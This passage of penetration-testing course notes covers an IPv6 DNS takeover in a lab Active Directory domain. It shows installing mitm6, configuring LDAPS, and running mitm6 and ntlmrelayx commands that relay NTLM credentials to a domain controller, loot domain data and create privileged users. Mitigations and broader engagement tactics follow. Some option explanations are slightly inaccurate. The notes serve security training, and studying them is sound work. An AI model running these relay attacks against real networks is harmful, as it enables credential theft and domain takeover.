    - Automates IPv6 DNS spoofing and interception.
2. **NTLMRelayX**:
    - Facilitates NTLM relay to create new accounts or escalate privileges.
3. **ELDAP Relaying**:
    - Technique to relay NTLM credentials to exploit Active Directory LDAP services.

---

### Attack Benefits

- **Reliable and difficult to detect**.
- Enables attackers to:
    - Gain access to sensitive information.
    - Escalate privileges within the domain.
    - Potentially persist in the network with minimal detection.

---

### Next Steps

1. **Setup and Tools**:
    - Download and install **MITM6**.
    - Configure necessary certificates for **NTLMRelayX**.
2. **Execution**:
    - Perform a live attack demonstration.

---

### Key Takeaways

- **IPv6 DNS Takeover** is highly effective due to:
    - Default IPv6 settings on Windows systems.
    - Unused IPv6 DNS, which creates an attack vector.
- **Practical applications** include:
    - Domain escalation.
    - Credential harvesting and exploitation.

---

Would you like me to save these notes as a .txt file?

# Installing mitm6

### Notes on Setting Up MITM6 (Man-in-the-Middle 6) Tool

### Purpose

- **MITM6** is a key tool for executing IPv6 man-in-the-middle attacks.

---

### Installation Steps

1. **Clone Repository**:
    - Use GitHub to obtain the MITM6 repository:
        
        ```Shell
        git clone <https://github.com/fox-it/mitm6.git>
        ```
        
    - Navigate to the folder:
        
        ```Shell
        cd mitm6
        ```
        
2. **Install Dependencies**:
    - Use `pip3` to install required Python dependencies:
        
        ```Shell
        pip3 install .
        ```
        
    - This step installs all necessary modules specified in the repository's `requirements.txt`.
3. **Verify Installation**:
    - The installation process is brief and straightforward.

---

### Next Steps

- Once MITM6 is installed, proceed to:
    - Configure tools like NTLMRelayX.
    - Begin orchestrating the IPv6 attack.

---

# Setting Up LDAPS

### Notes on Configuring the Lab for IPv6 MITM Attack

### Purpose

- The configuration ensures the environment is ready for running **LDAP over Secure (LDAPS)** to facilitate the attack.

---

### Steps to Configure the Certificate Authority

1. **Open Server Manager**:
    - Navigate to **Manage** → **Add Roles and Features**.
2. **Add Active Directory Certificate Services**:
    - Click through the prompts:
        - **Next**, **Next**, **Next**.
    - Select **Active Directory Certificate Services** and click **Add Features**.
3. **Choose the Role**:
    - Choose **Certification Authority**.
    - Confirm settings and select:
        - **Restart the destination server automatically if required**.
    - Click **Install**.
4. **Configure the Certification Authority**:
    - Once installed, open the configuration with the exclamation mark icon in Server Manager.
    - Go through the prompts:
        - Select **Certification Authority**.
        - Leave the default values for other prompts (e.g., SHA-256).
        - Extend certificate duration from **5 years to 99 years**.
5. **Finalize Setup**:
    - Click **Next** and then **Configure** to complete the certificate setup.

---

### Key Configuration Notes

- The certificate enables running **LDAP over Secure (LDAPS)**:
    - While the attack can proceed with plain LDAP, using LDAPS simplifies the process.
- Reboot the server after completing the configuration.

---

### Next Steps

- Ensure the server is fully operational after reboot.
- Proceed to the attack demonstration in the next phase.

---

# IPv6 DNS Takeover via mitm6

### Overview

This attack utilizes **MITM6** and **NTLMRelayX** to exploit IPv6 DNS, intercept credentials, and escalate privileges within a domain environment.

---

### Attack Setup

1. **Launching MITM6**:
    - Start **MITM6** with the target domain:
        
        ```Shell
        mitm6 -d marvel.local
        ```
        
    - The tool listens for IPv6 traffic and begins spoofing DNS replies for IPv6-enabled devices.
2. **Setting Up NTLMRelayX**:
    - Launch NTLMRelayX with the following options:
        
        ```Shell
        ntlmrelayx.py -6 -t ldaps://192.168.213.158 -wh fakewpad.marvel.local -l lootme
        ```
        
    - **Options explained**:
        - `6`: Restricts relaying to IPv6 traffic.
        - `t`: Specifies the target (LDAPS on the domain controller).
        - `-wpad`: Spoofs a fake WPAD (Web Proxy Auto-Discovery Protocol) service.
        - `l`: Sets a directory (`loot`) to save data like domain information.
3. **Triggering the Attack**:
    - Reboot a target machine (e.g., Windows 10):
        - Forces the device to send out DNS queries over IPv6, which MITM6 intercepts.
    - **Behavior**:
        - The victim machine attempts to authenticate.
        - Credentials are captured and relayed to the domain controller.

---

### Attack Execution

1. **Capturing Credentials**:
    - Relayed credentials appear in NTLMRelayX logs.
    - Looted information (e.g., domain users, groups, policies) is saved in the `loot` directory.
        
        ![[/image 28 2.png|image 28 2.png]]
        
2. **Accessing Domain Information**:
    
    1. Go into the created “loome” folder
        
        ![[/image 29 2.png|image 29 2.png]]
        
        ```Bash
        \#use the command
        
        firefox domain_admins_by_group.htlm
        ```
        
        ![[/image 30 2.png|image 30 2.png]]
        
    
    - Looted files provide insights into:
        - Domain administrators.
        - Domain users, groups, and policies.
        - Potential misconfigurations (e.g., plaintext passwords in descriptions).
            
            ![[/image 31 2.png|image 31 2.png]]
            
3. **Creating Users or Computers**:
    - Successful relaying allows:
        - Creation of a new user (e.g., `nfs-mg`) with elevated permissions.
        - Establishment of **Access Control Lists (ACLs)** to maintain persistence.
4. **Advanced Impersonation**:
    - Use **delegate impersonation** to:
        - Add new machines to the domain.
        - Impersonate users authenticated on compromised systems.

---

### Recommendations

1. **Review Delegated Access**:
    - Explore advanced techniques such as delegate impersonation.
    - Reference resources like blogs for in-depth analysis and examples.
2. **Further Steps**:
    - The next phase will focus on **defense strategies** to mitigate these vulnerabilities.

---

# IPv6 Attack Defenses

![[/image 32 2.png|image 32 2.png]]

## Key Points

1. **Disabling IPv6**:
    - Simplest way to prevent IPv6-based attacks is to disable IPv6 on the network.
    - Caveat: Disabling IPv6 may have unwanted side effects.
2. **Firewall Rules**:
    - Recommended approach: Use **block rules** instead of allow rules.
    - Focus on specifically preventing abuse instead of defaulting to open policies.
3. **WPAD (Web Proxy Auto-Discovery Protocol)**:
    - If not in use, **disable WPAD** using Group Policy.
4. **LDAP Relaying Mitigation**:
    - Enable **LDAP signing** and **channel binding**.
    - Prevents relaying to LDAP servers.
    - Often not enabled by most clients but critical for preventing such attacks.
5. **Protected Users Group**:
    - Adding users to the **Protected Users Group**:
        - Prevents impersonation.
        - Mitigates delegation attacks (though delegation wasn't covered in this session).
6. **Delegation Attacks**:
    - Delegation access, if exploited, can lead to further privilege abuse.
    - Avoid through proper administrative configurations.

## Best Practices to Mitigate Attacks

- Avoid complete IPv6 disabling if possible; instead:
    - Apply **specific block rules** in the firewall.
- **Disable WPAD** if unnecessary.
- Enable **LDAP signing** and **channel binding**.
- Use the **Protected Users Group** for admin accounts.

## Learning Recommendations

- Practice mitigation strategies in a lab setting:
    - Test the impact of block rules.
    - Experiment with enabling/disabling WPAD and LDAP configurations.
- Focus on understanding effects on attack scenarios rather than memorizing specific details.

## Final Notes

- Consider capturing screenshots or notes for reference.
- These topics may not commonly appear in interviews but are useful for real-world applications.
- Next Steps: Post-exploitation enumeration.

# Other Attack Vectors and Strategies

![[/image 33 2.png|image 33 2.png]]

## Key Points

1. **Initial Attack Strategies**:
    - Begin assessments with **Responder** or **Man-in-the-Middle (MITM) 6**.
        - Responder: Great to test network response and capture hashes.
        - MITM 6: Faster in environments with IPv6.
    - Ideal times to run tools: Start of the workday or after lunch when users log in.
    - Follow initial tests with **scans** to generate additional traffic:
        - Tools: **Nessus**, **Nmap**, or other quick scanning solutions.
    - Sweep the network to identify active websites if scanning must be subtle:
        - Use tools like `http_version` module in Metasploit for stealthy probing.
2. **Key Target Areas**:
    - **Websites in Scope**:
        - Investigate default credentials or known vulnerabilities for identified login pages.
    - **Printers**:
        - Printers with domain admin privileges due to scan-to-computer features can lead to domain admin compromise.
    - **Jenkins Instances**:
        - Developers' tools like Jenkins may allow shell access if misconfigured.
3. **Enumeration Tips**:
    - Prioritize hash capture with tools like Responder early on.
    - Identify open SMB shares and verify if **SMB signing** is disabled for relaying attacks.
    - Allocate specific times for:
        - Morning: Hash capture.
        - Afternoon: Relaying captured hashes or conducting specific attacks.
    - On larger networks, target websites instead of exhaustive port scans to reduce detection risk.
4. **Real-World Examples**:
    - Example: Using passwords captured from cleartext IMAP for further attacks.
    - Creative use of password-reset processes via compromised resources (e.g., phone systems) to bypass multi-factor authentication.
5. **General Strategy**:
    - Consider the client’s environment:
        - First-time assessments: Focus on low-hanging fruit.
        - Experienced clients: Look for unique, creative entry points.
    - Timed engagements require critical findings to be prioritized.
    - No findings are acceptable for highly secure environments, provided good enumeration was conducted.

## Takeaways for Enumerating and Gaining Access

- **Websites**:
    - Look for default credentials, weak configurations, or known vulnerabilities.
- **Ports**:
    - Explore open ports for potential access points, particularly overlooked resources.
- **Resilience**:
    - In challenging environments, enumerate thoroughly and think outside the box.

## Preparation for Post Compromise Enumeration

1. Next Section Overview:
    - Tools to explore: **PowerView**, **BloodHound**.
    - Topics: Post-compromise enumeration and privilege escalation.
2. Goals:
    - Move from lateral movement to domain dominance.
    - Leverage collected data to escalate privileges.